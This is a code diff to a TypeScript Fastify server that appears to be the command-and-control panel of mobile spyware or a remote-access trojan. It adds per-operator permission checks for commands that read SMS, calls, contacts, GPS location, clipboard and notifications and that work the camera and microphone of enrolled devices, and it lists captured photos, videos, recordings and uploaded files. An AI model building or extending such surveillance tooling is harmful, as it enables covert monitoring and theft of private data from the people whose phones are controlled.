@@ -27,6 +27,24 @@ const PAGE_PERMISSIONS: Record<string, Permission> = {
   downloads: 'files:download',
 };
 
+const CMD_PERMISSIONS: Partial<Record<CmdType, Permission>> = {
+  [CMD.SMS]: 'device:sms',
+  [CMD.CALLS]: 'device:calls',
+  [CMD.CONTACTS]: 'device:contacts',
+  [CMD.LOCATION]: 'device:gps',
+  [CMD.CAMERA]: 'device:camera',
+  [CMD.MIC]: 'device:mic',
+  [CMD.FILES]: 'device:files',
+  [CMD.WIFI]: 'device:wifi',
+  [CMD.CLIPBOARD]: 'device:clipboard',
+  [CMD.NOTIFICATIONS]: 'device:notifications',
+  [CMD.PERMISSIONS]: 'device:permissions',
+  [CMD.PERM_CHECK]: 'device:permissions',
+  [CMD.APPS]: 'device:apps',
+  [CMD.FASON]: 'device:fason',
+  [CMD.INFO]: 'device:view',
+};
+
 export async function deviceRoutes(app: FastifyInstance) {
   app.get('/api/clients', {
     preHandler: [app.auth, requirePermission('device:view')],
@@ -108,8 +126,22 @@ export async function deviceRoutes(app: FastifyInstance) {
       return reply.code(400).send({ success: false, error: 'Invalid command' });
     }
 
-    const sent = socketService.send(id, cmdType, params);
-    return { success: true, sent, queued: !sent };
+    const requiredPerm = CMD_PERMISSIONS[cmdType];
+    if (requiredPerm) {
+      const user = getRequestUser(request);
+      if (!user?.permissions || !user.permissions.includes(requiredPerm)) {
+        return reply.code(403).send({ success: false, error: `Insufficient permissions for this command (requires ${requiredPerm})` });
+      }
+    }
+
+    const d = getDb();
+    const client = d.select({ id: clients.id }).from(clients).where(eq(clients.id, id)).get();
+    if (!client) {
+      return reply.code(404).send({ success: false, error: 'Client not found' });
+    }
+
+    const result = socketService.send(id, cmdType, params);
+    return { success: true, sent: result.sent, queued: !result.sent, commandId: result.commandId };
   });
 
   app.post('/api/gps/:id/:interval', {
@@ -120,6 +152,12 @@ export async function deviceRoutes(app: FastifyInstance) {
 
     if (isNaN(intervalNum) || intervalNum < 0 || intervalNum > 3600) {
       return reply.code(400).send({ success: false, error: 'Interval must be between 0 and 3600 seconds' });
+    }
+
+    const d = getDb();
+    const client = d.select({ id: clients.id }).from(clients).where(eq(clients.id, id)).get();
+    if (!client) {
+      return reply.code(404).send({ success: false, error: 'Client not found' });
     }
 
     socketService.setGps(id, intervalNum);
@@ -188,16 +226,17 @@ function getPageData(id: string, page: string, client: any) {
       return { list: fileList, path: client.currentPath, error: fileError?.error || null };
     }
     case 'downloads': {
-      const files = dbHelpers.getClientFiles(id, 'download');
-      return { list: files };
+      const downloads = dbHelpers.getClientFiles(id, 'download');
+      const uploads = dbHelpers.getClientFiles(id, 'upload');
+      return { list: [...downloads, ...uploads] };
     }
     case 'camera': {
       const rawCameras = dbHelpers.getOrCreateClientData(id, 'cameras');
       const cameras = safeJsonParse(rawCameras);
       const photos = dbHelpers.getClientFiles(id, 'photo');
-      // Only report permission if cameras were actually detected (rawCameras !== '[]' means device responded)
+      const videos = dbHelpers.getClientFiles(id, 'video');
       const camerasDetected = rawCameras !== '[]';
-      return { cameras: cameras || [], photos, permission: camerasDetected ? client.cameraPermission : null };
+      return { cameras: cameras || [], photos, videos, permission: camerasDetected ? client.cameraPermission : null };
     }
     case 'mic': {
       const recordings = dbHelpers.getClientFiles(id, 'recording');
